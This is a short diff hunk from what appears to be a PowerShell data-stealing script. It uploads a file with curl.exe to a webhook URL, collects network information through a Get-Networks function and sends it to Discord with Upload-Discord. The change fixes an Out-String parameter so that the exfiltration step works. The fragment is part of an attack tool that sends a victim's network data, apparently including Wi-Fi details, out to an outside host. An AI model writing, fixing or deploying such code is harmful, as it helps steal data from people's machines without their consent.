@@ -63,7 +63,7 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 
 $Networks = Get-Networks
 
-$Networks = Out-String InputObject $Networks
+$Networks = Out-String -InputObject $Networks
 
 Upload-Discord -text $Networks
 
